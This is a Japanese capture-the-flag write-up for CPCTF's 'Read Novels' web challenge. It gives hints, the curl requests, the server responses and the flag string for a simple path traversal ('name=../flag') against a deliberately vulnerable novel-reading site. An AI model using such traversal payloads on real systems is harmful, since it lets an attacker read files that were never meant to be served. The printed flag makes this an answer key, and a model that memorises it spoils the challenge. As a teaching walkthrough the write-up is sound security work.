# Read Novels:Web:50.00pts
小説が読めるサイトを見つけたぞ！  
これ小説以外も見れるじゃん...  
サイト：[https://read-novels.web.cpctf.space](https://read-novels.web.cpctf.space/)  
配布ファイル：[https://files.cpctf.space/read-novels.zip](read-novels.zip)  

**Hint1**  
`app.py`をよく読んでみましょう。`filepath`に小説以外のファイルを入れるにはどうしたらよいでしょうか？  
**Hint2**  
パストラバーサル攻撃を行うことで、本来想定されていないファイルパスを開くことが出来るようになります。  
**Hint3 (解法)**  
`filepath`を`./novel/../flag`にするために、[https://read-novels.web.cpctf.space/novel?name=../flag](https://read-novels.web.cpctf.space/novel?name=../flag) に GET リクエストを飛ばしてみましょう。  

# Solution
URLとソースが渡される。  
アクセスすると、小説が読めるようだ。  
![site.png](site/site.png)  
リンクのURLクエリ`name`に小説名が指定されており、パストラバーサルが怪しい。  
```bash
$ curl 'https://read-novels.web.cpctf.space/novel?name=sanshiro'
<!DOCTYPE html>
<html>
  <head>
    <title>sanshiro</title>
    <style></style>
  </head>
  <body style="white-space: pre-wrap">
    <h1>sanshiro</h1>
    三四郎
夏目漱石
~~~
```
一つ上にたどってみる。  
```bash
$ curl 'https://read-novels.web.cpctf.space/novel?name=../flag'
<!DOCTYPE html>
<html>
  <head>
    <title>../flag</title>
    <style></style>
  </head>
  <body style="white-space: pre-wrap">
    <h1>../flag</h1>
    CPCTF{P4th_tr4v3rs41_15_v3ry_d4ng3r0u5}
  </body>
</html>
```
flagが得られた(実は開催前にドメインが見えておりflagが取得できていた)。  

## CPCTF{P4th_tr4v3rs41_15_v3ry_d4ng3r0u5}